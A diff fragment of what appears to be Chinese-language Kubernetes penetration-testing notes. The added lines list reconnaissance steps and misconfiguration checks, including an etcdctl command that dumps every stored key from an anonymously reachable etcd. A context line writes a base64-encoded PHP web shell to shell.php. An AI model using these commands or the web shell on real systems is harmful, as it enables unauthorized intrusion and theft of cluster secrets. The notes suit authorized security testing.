@@ -149,4 +149,15 @@ file_put_contents("shell.php",base64_decode("PD9waHAgCkBldmFsKCRfUE9TVFsnY21kJ10
 curl -i -s -k -X $’GET’ \
 -H $’Host: service-1.kube.com’ \
 $’https://<NODE-IP:8888>/'
-
+发现敏感服务
+1、crt.sh   "k8s.%.com"
+2、github
+3、端口扫描 Kubernetes 集群中可能会开放以下端口（取自Kubernetes 研讨会演示）：
+4、探索网络插件  cAdvisor 
+查找集群配置错误
+当 Kubernetes API 暴露于远程交互时，此部分非常有用。
+1. 检查API服务器的匿名访问
+2. 检查ETCD匿名访问
+如果ETCD可以匿名访问，您可能需要使用etcdctl工具。以下命令将获取存储的所有密钥：
+etcdctl –endpoints=http://<MASTER-IP>:2379 get / –prefix –keys-only
+3、检查Kubelet（只读端口）信息暴露情况
